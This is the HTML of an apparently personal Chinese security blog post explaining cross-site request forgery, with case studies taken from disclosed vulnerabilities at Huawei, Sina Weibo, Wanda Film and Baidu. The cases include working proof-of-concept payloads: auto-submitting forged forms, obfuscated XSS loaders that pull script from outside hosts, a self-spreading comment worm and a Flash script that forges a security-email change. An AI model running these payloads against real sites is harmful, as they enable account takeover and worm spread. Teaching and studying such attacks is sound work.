@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                Cross-site request forgery |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Cross-site request forgery</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2016-11-01 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CSRF/">CSRF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>7 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="0x00-什么是CSRF"><a href="#0x00-什么是CSRF" class="headerlink" title="0x00 什么是CSRF"></a>0x00 什么是CSRF</h3><p>CSRF：<code>Cross-Site Request Forgery，跨站请求伪造</code></p>
+<p>在OWASP中是这样说的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求,包括该用户的会话cookie</span><br><span class="line">和其他认证信息,发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求,而这些请求会被应用程序认为是用户的合法请求</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-CSRF攻击分类"><a href="#0x01-CSRF攻击分类" class="headerlink" title="0x01 CSRF攻击分类"></a>0x01 CSRF攻击分类</h3><ul>
+<li>GET</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个GET请求，请求中没有token验证和referer验证，然后还有一个固定的变量可以被控制</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>POST</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个POST请求，请求中没有token参数，也没有验证referer</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>POST-&gt;GET</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个POST请求，请求中没有token参数，但是验证了referer。然而可以将post请求改写为get请求，然后通过第一种的情况进行利用</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CSRF+XSS</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传说中的“黄金搭档”</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>FLASH CSRF</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF</span><br><span class="line"></span><br><span class="line">说真的，在学习这个之前还真不知道crossdomain.xml这个文件的作用</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-CSRF的主要危害"><a href="#0x02-CSRF的主要危害" class="headerlink" title="0x02 CSRF的主要危害"></a>0x02 CSRF的主要危害</h3><ul>
+<li><p>篡改目标网站上的用户数据</p>
+</li>
+<li><p>盗取用户隐私数据</p>
+</li>
+<li><p>作为其他攻击向量的辅助攻击手法</p>
+</li>
+<li><p>传播CSRF蠕虫</p>
+</li>
+</ul>
+<h3 id="0x03-CSRF案例解析"><a href="#0x03-CSRF案例解析" class="headerlink" title="0x03 CSRF案例解析"></a>0x03 CSRF案例解析</h3><ul>
+<li><h4 id="华为商城某处CSRF可修改安全邮箱"><a href="#华为商城某处CSRF可修改安全邮箱" class="headerlink" title="华为商城某处CSRF可修改安全邮箱"></a>华为商城某处CSRF可修改安全邮箱</h4></li>
+</ul>
+<p>漏洞点<code>http://www.vmall.com/member/updateEmail.json?email=xxxx@xxx.com</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="15190486321450.jpg"></p>
+<p><img lazyload src="/images/loading.svg" data-src="15190486387105.jpg"></p>
+<p>然后就可以修改绑定邮箱，然后通过邮箱修改密码，登录帐号</p>
+<ul>
+<li><h4 id="新浪微博CSRF点链接关注"><a href="#新浪微博CSRF点链接关注" class="headerlink" title="新浪微博CSRF点链接关注"></a>新浪微博CSRF点链接关注</h4></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="15190486493770.jpg"></p>
+<p>这里uid可以是任意用户</p>
+<p>利用burp简单构造poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://movie.weibo.com/feed/relation/index/?fajtype=follow&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1944519257&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><h4 id="新浪微博CSRF之点我链接发微博"><a href="#新浪微博CSRF之点我链接发微博" class="headerlink" title="新浪微博CSRF之点我链接发微博"></a>新浪微博CSRF之点我链接发微博</h4></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="15190486616930.jpg"></p>
+<p><img lazyload src="/images/loading.svg" data-src="15190486683177.jpg"></p>
+<p><a class="link" target="_blank" rel="noopener" href="http://wanwan.sina.com.cn.llunull.tk/a.php">http://wanwan.sina.com.cn.llunull.tk/a.php<i class="fas fa-external-link-alt"></i></a></p>
+<p>此处构造poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://wanwan.sina.com.cn/t_sina/event/sxd.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;e&quot; value=&quot;5&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;img&quot; value=&quot;http://wanwan.sina.com.cn.llunull.tk/sina_csrf.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;hello,[email protected]://wanwan.sina.com.cn.llunull.tk/a.php&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;ra&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><h4 id="某通用cms添加后台管理员的CSRF漏洞"><a href="#某通用cms添加后台管理员的CSRF漏洞" class="headerlink" title="某通用cms添加后台管理员的CSRF漏洞"></a>某通用cms添加后台管理员的CSRF漏洞</h4></li>
+</ul>
+<p>添加后台管理员请求如下：</p>
+<p><img lazyload src="/images/loading.svg" data-src="15190486758847.png"></p>
+<p>然后将post请求改成get也可以成功发包。</p>
+<p><code>http://127.0.0.1/asp/Survey/admin/Admin.asp?Username=test222&amp;Password1=123456&amp;Password2=123456&amp;action=yes</code></p>
+<ul>
+<li><h4 id="万达电影主站xss-csrf又是蠕虫"><a href="#万达电影主站xss-csrf又是蠕虫" class="headerlink" title="万达电影主站xss+csrf又是蠕虫"></a>万达电影主站xss+csrf又是蠕虫</h4></li>
+</ul>
+<p>电影的评论处存在存储型xss</p>
+<p>payload：<code>&lt;img src=x onerror=$[&#39;get\123cript&#39;](&#39;//20.rs&#39;) width=0&gt;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="15190487212173.png"></p>
+<p>CSRF的蠕虫代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var url=&quot;http://www.wandafilm.com/user/comment.do?m=addFilmComment&quot;;</span><br><span class="line">var sendata = &quot;filmId=20140507033232512405&amp;commentContent=%3Cimg+src%3Dx+onerror%3D%24%5B&#x27;get\\123cript&#x27;%5D(&#x27;%2F%2Fkm3.pw&#x27;)+width%3D0%3E&amp;cmType=0&amp;code=&quot;;</span><br><span class="line">if (window.XMLHttpRequest)&#123;</span><br><span class="line">var xmlhttp1=new XMLHttpRequest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">var xmlhttp1=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp1.open(&quot;POST&quot;,url,true);</span><br><span class="line">xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp1.send(sendata);</span><br></pre></td></tr></table></figure>
+<p>filmId是想要蔓延过去的电影ID的值，只需要改变电影ID就可以实现蠕虫的蔓延，当然这只是测试了</p>
+<ul>
+<li><h4 id="百度某站可结合CSRF及XSS劫持账号"><a href="#百度某站可结合CSRF及XSS劫持账号" class="headerlink" title="百度某站可结合CSRF及XSS劫持账号"></a>百度某站可结合CSRF及XSS劫持账号</h4></li>
+</ul>
+<p>在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。</p>
+<p>一个“SELF-XSS”,只能跨自己，有什么用呢？</p>
+<p>考虑利用CSRF来触发这个XSS</p>
+<p>构造POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;baidu&quot; name=&quot;baidu&quot; action=&quot;http://dict.baidu.com/wordlist.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;req&quot; value=&quot;add&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;word&quot; value=&quot;Wooyun&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;explain&quot; value=&quot;&lt;script src=http://xsserme&gt;&lt;/script&gt;&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        document.baidu.submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>诱惑受害者访问该页面</p>
+<p>已经成功添加了一个新单词“Wooyun”</p>
+<p>代码成功执行</p>
+<p>[来源wooyun]</p>
+<ul>
+<li><h4 id="flash-csrf自动设置自己的密保邮箱"><a href="#flash-csrf自动设置自己的密保邮箱" class="headerlink" title="flash csrf自动设置自己的密保邮箱"></a>flash csrf自动设置自己的密保邮箱</h4></li>
+</ul>
+<p>当一个访客访问伪造链接的时候，自动设置自己的密保邮箱。</p>
+<p>申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：<code>POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com</code></p>
+<p>之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。</p>
+<p>利用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!as3</span><br><span class="line">package &#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.events.Event;</span><br><span class="line">    import flash.net.*;</span><br><span class="line">    import flash.text.TextField;</span><br><span class="line">    public class url extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function url()</span><br><span class="line">        &#123;</span><br><span class="line">            //获取当前页面userid/token</span><br><span class="line">            var echo_txt:TextField = new TextField();</span><br><span class="line">            var targetURL:String = &quot;http://xx.xx.cc&quot;;</span><br><span class="line">            var request:URLRequest = new URLRequest(targetURL);</span><br><span class="line">            request.method = URLRequestMethod.GET;</span><br><span class="line">            request.data = &quot;&quot;;</span><br><span class="line">            sendToURL(request);</span><br><span class="line">            var loader:URLLoader=new URLLoader();</span><br><span class="line">            loader.addEventListener(Event.COMPLETE,completeHandler);</span><br><span class="line">            function completeHandler(event:Event):void&#123;</span><br><span class="line">            var userid:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];</span><br><span class="line"></span><br><span class="line"> var masthash:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];</span><br><span class="line">            echo_txt.text =  masthash;</span><br><span class="line">            //伪造申请密保邮箱POST请求</span><br><span class="line">            var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;</span><br><span class="line">            var emailrequest:URLRequest = new URLRequest(emailtargetURL);</span><br><span class="line">            emailrequest.method = URLRequestMethod.POST;</span><br><span class="line">            var postdata:Object = new Array();</span><br><span class="line">            postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;</span><br><span class="line">            emailrequest.data = postdata[0];</span><br><span class="line">            sendToURL(emailrequest);</span><br><span class="line">            &#125;</span><br><span class="line">            loader.load(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在可以注册一个新邮箱测试一下了</p>
+<p>[来源wooyun]</p>
+<h3 id="0x04-CSRF的防御"><a href="#0x04-CSRF的防御" class="headerlink" title="0x04 CSRF的防御"></a>0x04 CSRF的防御</h3><p>token校验</p>
+<h3 id="0x05-CSRF总结"><a href="#0x05-CSRF总结" class="headerlink" title="0x05 CSRF总结"></a>0x05 CSRF总结</h3><p>只要够猥琐，一个小洞也能上天</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Cross-site request forgery</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2016-11-01 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/Cross-site request forgery/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/Local%20File%20Inclusion%20and%20Remote%20File%20Inclusion/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Local File Inclusion and Remote File Inclusion</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Wordpress_Plugin_SinglePersonalMessage1.0.3%20sql%20injection/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Wordpress_Plugin_SinglePersonalMessage1.0.3 sql injection</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E4%BB%80%E4%B9%88%E6%98%AFCSRF"><span class="nav-text">0x00 什么是CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-CSRF%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="nav-text">0x01 CSRF攻击分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-CSRF%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8D%B1%E5%AE%B3"><span class="nav-text">0x02 CSRF的主要危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-CSRF%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90"><span class="nav-text">0x03 CSRF案例解析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8E%E4%B8%BA%E5%95%86%E5%9F%8E%E6%9F%90%E5%A4%84CSRF%E5%8F%AF%E4%BF%AE%E6%94%B9%E5%AE%89%E5%85%A8%E9%82%AE%E7%AE%B1"><span class="nav-text">华为商城某处CSRF可修改安全邮箱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9ACSRF%E7%82%B9%E9%93%BE%E6%8E%A5%E5%85%B3%E6%B3%A8"><span class="nav-text">新浪微博CSRF点链接关注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9ACSRF%E4%B9%8B%E7%82%B9%E6%88%91%E9%93%BE%E6%8E%A5%E5%8F%91%E5%BE%AE%E5%8D%9A"><span class="nav-text">新浪微博CSRF之点我链接发微博</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%90%E9%80%9A%E7%94%A8cms%E6%B7%BB%E5%8A%A0%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">某通用cms添加后台管理员的CSRF漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%87%E8%BE%BE%E7%94%B5%E5%BD%B1%E4%B8%BB%E7%AB%99xss-csrf%E5%8F%88%E6%98%AF%E8%A0%95%E8%99%AB"><span class="nav-text">万达电影主站xss+csrf又是蠕虫</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BE%E5%BA%A6%E6%9F%90%E7%AB%99%E5%8F%AF%E7%BB%93%E5%90%88CSRF%E5%8F%8AXSS%E5%8A%AB%E6%8C%81%E8%B4%A6%E5%8F%B7"><span class="nav-text">百度某站可结合CSRF及XSS劫持账号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flash-csrf%E8%87%AA%E5%8A%A8%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AF%86%E4%BF%9D%E9%82%AE%E7%AE%B1"><span class="nav-text">flash csrf自动设置自己的密保邮箱</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-CSRF%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-text">0x04 CSRF的防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-CSRF%E6%80%BB%E7%BB%93"><span class="nav-text">0x05 CSRF总结</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
